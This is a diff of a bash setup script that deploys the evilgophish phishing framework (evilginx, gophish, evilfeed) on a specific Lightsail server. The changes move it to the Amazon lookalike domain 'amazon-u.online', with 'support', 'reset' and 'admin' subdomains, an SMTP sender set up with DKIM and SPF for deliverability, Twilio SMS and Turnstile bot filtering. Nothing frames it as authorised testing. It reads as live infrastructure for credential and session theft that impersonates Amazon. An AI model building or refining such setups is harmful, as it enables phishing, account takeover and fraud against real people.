@@ -1,19 +1,19 @@
-!/bin/bash
-# setup.sh - Setup for evilgophish with SMTP (docker-mailserver) on Lightsail (3.147.37.21).
-# Fixes: Initializes mailconfig with postfix-main.cf; ensures DKIM generation; validates src/evilfeed.
-# SMTP: Configures support@amazon-u.com; integrates with GoPhish.
+#!/bin/bash
+# setup.sh - Setup for evilgophish with SMTP on Lightsail (3.147.37.21).
+# Changes: Domain updated to amazon-u.online; validates src/evilginx,gophish,evilfeed.
+# SMTP: Configures support@amazon-u.online for GoPhish/Evilginx.
+# Fixes: Ensures mailconfig/postfix-main.cf; retries DKIM generation.
 # Usage: ./setup.sh [DOMAIN] [SUBDOMAINS] [PROXY_ROOT] [FEED_ENABLED] [RID_REPLACEMENT] [TWILIO_SID] [TWILIO_TOKEN] [TWILIO_PHONE] [TURNSTILE_PUBLIC] [TURNSTILE_PRIVATE] [SMTP_USER] [SMTP_PASS]
 # Best Practices:
-# - Validate inputs; backup configs; chmod secrets.
-# - DNS: Delegate to Lightsail; add A/MX/TXT records.
-# - Mailconfig: Pre-create postfix-main.cf; generate DKIM post-up.
-# - Lightsail: Open ports 25/465/587,80/443; request port 25 throttle removal.
-# - Tips: Test SMTP with swaks; backup maildata; monitor maillogs.
+# - Validate src dirs; backup configs; secure secrets.
+# - DNS: Lightsail zone; delegate from GoDaddy.
+# - Mail: Generate DKIM; test with swaks; monitor deliverability.
+# - Lightsail: Open ports; request port 25 removal.
 
 set -e
 
 # Defaults/Prompts
-DOMAIN="${1:-amazon-u.com}"
+DOMAIN="${1:-amazon-u.online}"
 SUBDOMAINS="${2:-support email reset admin}"
 PROXY_ROOT="${3:-true}"
 FEED_ENABLED="${4:-true}"
@@ -26,7 +26,7 @@ TURNSTILE_PRIVATE="${10:-$(read -s -p "Turnstile Private: " x; echo $x)}"
 SMTP_USER="${11:-support@${DOMAIN}}"
 SMTP_PASS="${12:-$(read -s -p "SMTP Pass for ${SMTP_USER}: " x; echo $x)}"
 
-# Validate
+# Validate inputs
 [ -z "$SMTP_PASS" ] && { echo "Error: SMTP_PASS required"; exit 1; }
 [ -z "$TWILIO_SID" ] && { echo "Error: TWILIO_SID required"; exit 1; }
 [ -z "$TWILIO_TOKEN" ] && { echo "Error: TWILIO_TOKEN required"; exit 1; }
@@ -108,11 +108,14 @@ echo "- A: mail.$DOMAIN -> 3.147.37.21"
 echo "- MX: @ -> mail.$DOMAIN (priority 10)"
 echo "- SPF: TXT v=spf1 mx a ip4:3.147.37.21 ~all"
 
-# Clone src
+# Clone and validate src
 [ ! -d ./src ] && git clone https://github.com/fin3ss3g0d/evilgophish.git src
 cd src
 git pull
-[ ! -d ./evilfeed ] && { echo "Error: src/evilfeed missing. Ensure repo includes evilfeed code."; exit 1; }
+for dir in evilginx gophish evilfeed; do
+  [ ! -d "./$dir" ] && { echo "Error: src/$dir missing. Ensure repo includes $dir code."; exit 1; }
+  [ ! -f "./$dir/main.go" ] && { echo "Error: src/$dir/main.go missing. Verify repo integrity."; exit 1; }
+done
 cd ..
 
 # RID replacement
@@ -181,7 +184,7 @@ docker compose up -d --build
 
 # Mail setup (wait for mailserver to be healthy)
 echo "Waiting for mailserver to be ready..."
-sleep 10  # Allow container startup
+sleep 15  # Extended delay for container startup
 docker exec -it mailserver setup email add "${SMTP_USER}" "${SMTP_PASS}"
 docker exec -it mailserver setup config dkim
 echo "DKIM generated. Add this TXT to Lightsail DNS:"
